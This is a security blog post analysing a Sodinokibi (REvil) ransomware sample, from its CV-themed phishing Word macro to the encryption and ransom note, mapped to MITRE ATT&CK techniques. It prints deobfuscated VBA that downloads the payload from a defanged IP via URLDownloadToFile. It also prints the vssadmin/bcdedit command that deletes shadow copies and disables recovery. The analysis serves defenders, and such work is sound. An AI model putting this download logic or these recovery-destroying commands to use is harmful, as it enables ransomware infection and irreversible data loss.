 <h4>The Blue Report 2024</h4>
 <div class="desc"><p><span>Get a comprehensive analysis of over 136 million cyber attacks and understand the state of threat exposure management.</span></p></div>
 
 
 
 <a class="button" href="https://www.picussecurity.com/resource/report/blue-report-2024" target="_blank" rel="noopener">

 </a>
 
</div>			 
			 
			 <span id="hs_cos_wrapper_post_body" class="hs_cos_wrapper hs_cos_wrapper_meta_field hs_cos_wrapper_type_rich_text" style="" data-hs-cos-general-type="meta_field" data-hs-cos-type="rich_text"><p style="font-size: 18px;"><strong> Sodinokibi ransomware, also known as REvil or Sodin, has been responsible for a series of high-profile attacks since April 2019:</strong></p>
<img src="https://www.picussecurity.com/hubfs/Imported_Blog_Media/img5.png" alt="Sodinokibi ransomware" title="Image">
<p>Picus is designed to simulate adversarial Tactics, Techniques and Procedures (TTPs) in endpoints by mimicking malware activities without adversely affecting endpoint systems. In this way, emergent and prevalent APT and malware threats are reverse-engineered and malware actions are analyzed to build endpoint threat scenarios. Each action as an attack technique is mapped to MITRE’s ATT&amp;CK (Adversarial Tactics, Techniques, and Common Knowledge) framework. The remaining part of this article analysis of a Sodinokibi sample with referring to ATT&amp;CK tactics and techniques.</p>
<h3>Initial Access</h3>
<p>Spearphishing Attachment (<a href="https://attack.mitre.org/techniques/T1193/" target="_blank" rel="noopener">ATT&amp;CK T1193</a>) is one of the most used Initial Access techniques used by ransomware families as in Sodinokibi. Attackers use spam emails with an attached MS Office Word document including a malicious macro to download the ransomware to the target system. In order to show the lifecycle of Sodinokibi ransomware, we analyzed a Microsoft Word document. The specific sample analyzed below is Bewerbungsunterlagen_6704760.doc ( <span style="font-family: SFMono-Regular,Menlo,Monaco,Consolas,Liberation Mono,Courier New,monospace; color: #156eac;">SHA-256: fb8b03748b617acf0ee3b138c5b37e74ec396bc73da3362d633862d7283742fd</span> , detection rate is only <a href="https://www.virustotal.com/gui/file/fb8b03748b617acf0ee3b138c5b37e74ec396bc73da3362d633862d7283742fd/detection" target="_blank" rel="noopener">33/60</a> as of today). Even though Sodinokibi uses simple obfuscation techniques mentioned below, 30 of 60 antiviruses cannot detect it. “Bewerbungsunterlagen” means “application document” in German, and the attackers used a CV theme to lure victims into downloading the document. Sodinokibi is a “Ransomware-as-a-Service (RAAS) malware, so its distribution methods vary depending on the attacker distributing it. Attackers have used the following Initial Access techniques in their other campaigns to deliver Sodinokibi:</p>
<ul style="margin-top: 0px; margin-bottom: 0px;">
<li>Exploit Public-Facing Application (<a href="https://attack.mitre.org/techniques/T1190/" target="_blank" rel="noopener">ATT&amp;CK T1190</a>) : Attackers exploit vulnerabilities in enterprise applications to distribute it, such as the deserialization vulnerability <a href="https://www.oracle.com/security-alerts/alert-cve-2019-2725.html" target="_blank" rel="noopener">CVE-2019-2725</a> in Oracle WebLogic Server having a CVSS score of 9.8/10.</li>
<li>Remote Desktop Protocol ( <a href="https://attack.mitre.org/techniques/T1021/" target="_blank" rel="noopener">ATT&amp;CK T1076</a>) : Attackers use RDP to deliver Sodinokibi. This delivery technique can also be classified in External Remote Services ( <a href="https://attack.mitre.org/techniques/T1133/" target="_blank" rel="noopener">ATT&amp;CK T1133</a>).</li>
<li>Supply Chain Compromise ( <a href="https://attack.mitre.org/techniques/T1195/" target="_blank" rel="noopener">ATT&amp;CK T1195</a>) : Sodinokibi ransomware was distributed through a <a href="https://www.drcommodore.it/2019/06/20/hackerato-winrar-it-malware-al-posto-del-programma/" target="_blank" rel="noopener">compromised version</a> of WinRAR downloaded from the WinRAR Italia website.</li>
<li>Drive-by-Compromise ( <a href="https://attack.mitre.org/techniques/T1189/" target="_blank" rel="noopener">ATT&amp;CK T1189</a>): Attackers <a href="https://www.bleepingcomputer.com/news/security/sodinokibi-ransomware-spreads-via-fake-forums-on-hacked-sites/" target="_blank" rel="noopener">compromised WordPress sites</a> and injected JavaScript over the content of the original site to spread Sodinokibi.</li>
</ul>
<p style="margin-top: 0px;">When a victim opens the document, Microsoft Word asks to enable/disable macros. It reveals that a macro is embedded in the document (Scripting, <a href="https://attack.mitre.org/techniques/T1064/" target="_blank" rel="noopener">ATT&amp;CK T1054</a>).</p>
<img src="https://www.picussecurity.com/hubfs/Imported_Blog_Media/img0%20(2).png" alt="ATT&amp;CK T1054" title="Image" style="width: 60%;" loading="lazy">
<p>The malicious document claims that it was created in an earlier version of Microsoft Office and asks the victim to enable the content, which launches the code hidden in the macros.</p>
<img src="https://www.picussecurity.com/hubfs/Imported_Blog_Media/img3%20(1).png" alt="Defense Evasion" title="Image" style="width: 60%;" loading="lazy">
<h3>Defense Evasion</h3>
<p>When we examined macros in the document, we saw that VBA (Visual Basic for Applications) codes were split into modules and functions for the purpose of obfuscation (Obfuscated Files or Information, <a href="https://attack.mitre.org/techniques/T1027/" target="_blank" rel="noopener">ATT&amp;CK T1027</a>).</p>
<img src="https://www.picussecurity.com/hubfs/Imported_Blog_Media/img4%20(1).png" alt="Function fP1()" title="Image" style="width: 50%; margin-left: 0;" loading="lazy">
<pre><span style="font-size: 18px;">                Function fP1()
                <span style="margin-left: 15px;">v1 = 465</span>
                <span style="margin-left: 15px;">Select Case v1</span>
                <span style="margin-left: 30px;">Case 1 To 5</span>
                <span style="margin-left: 45px;">fP1 = "hello"</span>
                <span style="margin-left: 30px;">Case 6, 7, 8</span>
                <span style="margin-left: 45px;">fP1 = "hello2"</span>
                <span style="margin-left: 30px;"> Case 9 To 10</span>
                <span style="margin-left: 45px;">fP1 = "hello3"</span>
                <span style="margin-left: 30px;">Case Else</span>
                <span style="margin-left: 45px;"><strong>fP1 = "C:\\Windows" &amp; fP2 &amp; fP3</strong></span>
                <span style="margin-left: 15px;">End Select</span>
              End Function
            </span></pre>
<pre><span style="font-size: 18px;">                Function fP2()
                <span style="margin-left: 15px;"><strong>fP2 = "\\Te"</strong></span>
              End Function
            </span></pre>
<pre><span style="font-size: 18px;">                Function fP3()
                <span style="margin-left: 15px;"><strong>fP3 = "mp\\MicrosoftOfficeWord_upd.v.88735.34.5" + "." + "exe"</strong></span>
              End Function
            </span></pre>
<p>“We combined the above functions and revealed that <span style="font-family: SFMono-Regular,Menlo,Monaco,Consolas,Liberation Mono,Courier New,monospace; color: #156eac;">fP1 = "C:\\Windows\\Temp\\MicrosoftOfficeWord_upd.v.88735.34.5.exe”</span>.</p>
<pre><span style="font-size: 18px;">              Function fP1()
              <span style="margin-left: 15px;">v1 = 345</span>
              <span style="margin-left: 15px;">Select Case v1</span>
              <span style="margin-left: 30px;">Case 1 To 5</span>
              <span style="margin-left: 45px;">fP1 = "hello"</span>
              <span style="margin-left: 30px;">Case 6, 7, 8</span>
              <span style="margin-left: 45px;">fP1 = "hello2"</span>
              <span style="margin-left: 30px;"> Case 9 To 10</span>
              <span style="margin-left: 45px;">fP1 = "hello3"</span>
              <span style="margin-left: 30px;">Case Else</span>
              <span style="margin-left: 45px;"><strong>fU1 = fU2(Array(10, 20, 30))</strong></span>
              <span style="margin-left: 15px;">End Select</span>
            End Function
          </span></pre>
<pre><span style="font-size: 18px;">              Function fU2(v1)
              <span style="margin-left: 15px;">If IsArray(v1) = True Then</span>
              <span style="margin-left: 30px;"><strong>fU2 = "hxxp://54.39.233.132/de1.trp"</strong></span>
              <span style="margin-left: 15px;">Else</span>
              <span style="margin-left: 30px;">fU2 = "hello"</span>
              <span style="margin-left: 15px;">End If</span>
            End Function
          </span></pre>
<p>According to the above functions, <span style="font-family: SFMono-Regular,Menlo,Monaco,Consolas,Liberation Mono,Courier New,monospace; color: #156eac;">fU1 = "hxxp://54.39.233.132/de1.trp"</span>.</p>
<p>As we know the fU1 and fP1 parameters, we can understand the following function:</p>
<pre><span style="font-size: 18px;">              Function fD2(v1 As Integer, v2 As Integer)
              <span style="margin-left: 15px;"> If v1 = v2 Then</span>
              <span style="margin-left: 30px;"><strong>fD2 = URLDownloadToFile(0, fU1, fP1, 0, 0)</strong></span>
              <span style="margin-left: 15px;">Else</span>
              <span style="margin-left: 30px;">fD2 = 123</span>
              <span style="margin-left: 15px;">End If</span>
            End Function
          </span></pre>
<p>The <a href="https://docs.microsoft.com/en-us/previous-versions/windows/internet-explorer/ie-developer/platform-apis/ms775123(v%3Dvs.85)" target="_blank" rel="noopener">URLDownloadToFile</a> function downloads bits from the Internet and saves them to a file. Let’s put the values we obtained into this function:</p>
<p><span style="font-family: SFMono-Regular,Menlo,Monaco,Consolas,Liberation Mono,Courier New,monospace; color: #156eac;">URLDownloadToFile(0, hxxp://54.39.233.132/de1.trp, C:\\Windows\\Temp\\MicrosoftOfficeWord_upd.v.88735.34.5.exe, 0, 0)</span></p>
<p>The second parameter (fU1) is a string value that contains the URL to download, and the third parameter (fP1) is a string value containing the name or full path of the file to create for the download. Accordingly, this function downloads <strong>de1.trp</strong> from <strong>54.39.233.132</strong> and saves it to the <strong> C:\Windows\Temp\ </strong> directory as <strong>MicrosoftOfficeWord_upd.v.88735.34.5.exe</strong>.</p>
<p>The downloaded file is the Sodinokibi ransomware (<span style="font-family: SFMono-Regular,Menlo,Monaco,Consolas,Liberation Mono,Courier New,monospace; color: #156eac;">SHA-256: 720fbe60f049848f02ba9b2b91926f80ba65b84f0d831a55f4e634c820bd0848</span>, detection rate is 51/69 as of today). Its artifacts usually mimic the names of known executables for Defense Evasion, such as a Microsoft Word update file name (MicrosoftOfficeWord_upd.v.88735.34.5.exe) as in this sample (Masquerading, <a href="https://attack.mitre.org/techniques/T1064/" target="_blank" rel="noopener">ATT&amp;CK T1036</a>).</p>
<h3>Execution</h3>
<img src="https://www.picussecurity.com/hubfs/Imported_Blog_Media/img6%20(1).png" alt="As seen in the above process graph" title="Image">
<p>As seen in the above process graph, the macro in the Word document downloads and runs Sodinokibi executable. After execution, it runs the following command using cmd.exe (Command-Line Interface, <a href="https://attack.mitre.org/techniques/T1059/" target="_blank" rel="noopener">ATT&amp;CK T1059</a>):</p>
<pre><span style="font-size: 18px;">              C:\Windows\System32\cmd.exe" /c vssadmin.exe Delete Shadows /All /Quiet &amp; bcdedit /set {default} recoveryenabled No &amp; bcdedit /set {default} bootstatuspolicy ignoreallfailures
          </span></pre>
<ul>
<li>At first, this command runs <strong>vssadmin.exe</strong> to delete all volume shadow copies on the system to prevent recovery (Inhibit System Recovery, <a href="https://attack.mitre.org/techniques/T1490/" target="_blank" rel="noopener noreferrer"> ATT&amp;CK T1490</a>)
<pre>                  vssadmin.exe Delete Shadows /All /Quiet
                </pre>
</li>
<li>Then, it uses <strong>bcdedit.exe</strong> twice to disable automatic Windows recovery features by modifying boot configuration data (Inhibit System Recovery, <a href="https://attack.mitre.org/techniques/T1490/" target="_blank" rel="noopener noreferrer">ATT&amp;CK T1490</a>)
<pre>                  bcdedit /set {default} recoveryenabled No
                  <br>
                  bcdedit /set {default} bootstatuspolicy ignoreallfailures
                </pre>
</li>
</ul>
<p style="margin-top: 0;">Sigma rules detecting the above actions are given in the Appendix.</p>
<h3>Impact</h3>
<p>Like most ransomware, Sodinokibi encrypts files and adds a random extension such as “test.jpg.1cd8t9ahd5” (Data Encrypted for Impact, <a href="https://attack.mitre.org/techniques/T1486/" target="_blank" rel="noopener noreferrer">ATT&amp;CK T1486</a>). It also drops a ransom note in folders that contain encrypted files. The name of the ransom note is the random extension added to the encrypted files. For example, if the extension is ".1cd8t9ahd5", the ransom message filename will be called "1cd8t9ahd5-HOW-TO-DECRYPT.txt".</p>
<img src="https://www.picussecurity.com/hubfs/Imported_Blog_Media/img1%20(2).png" alt="revil ransomware analysis" title="Image" loading="lazy">
<p>The ransom note recommends accessing the attacker’s website over the TOR browser: hxxp://aplebzu47wgazapdqks6vrcv6zcnjppkbxbr6wketf56nf6aq2nmyoyd.onion/C2D97495C4BA3647</p>
<p>When we accessed the website, we saw the following page that wants 0,6346 Bitcoin worth $5,000. If you pay the ransom in two days, the cost is halving.</p>
<img src="https://www.picussecurity.com/hubfs/Imported_Blog_Media/img2%20(3).png" alt="sodinokibi ransomware" title="Image" style="width: 60%;" loading="lazy">
<p>In the “ABOUT US” section on their website, they claim that they developed the best data encryption and decryption system available today. I am sure they did not develop the best encryption method, but they use multiple encryption by encrypting files and also the private keys. To put it another way, it requires two keys for decryption. Sodinokibi uses AES encryption to encrypt the private keys, and Salsa20 for encrypting files. As far as I know, unfortunately there are no decryption tools to restore data encrypted by Sodinokibi ransomware.</p>
<img src="https://www.picussecurity.com/hubfs/Imported_Blog_Media/img7.png" alt="sodinokibi ransomware analysis" title="CONCLUSION" style="width: 60%;" loading="lazy">
<h2>CONCLUSION</h2>
<p>In this wave of attacks, Sodinokibi ransomware spreads by spearphishing emails that lure victims into downloading a CV themed Word document, which contains a macro that downloads and executes the ransomware. Commands in the macro are split into different modules and functions for defense evasion. After infection, Sodinokibi encrypts files and puts a ransom note in folders that contain encrypted files. It also deletes all volume shadow copies and disables automatic Windows recovery features to inhibit system recovery. Sodinokibi uses very similar infection and execution techniques with the notorious GandCrab ransomware, raising suspicion that it was developed by GandCrab authors.</p>
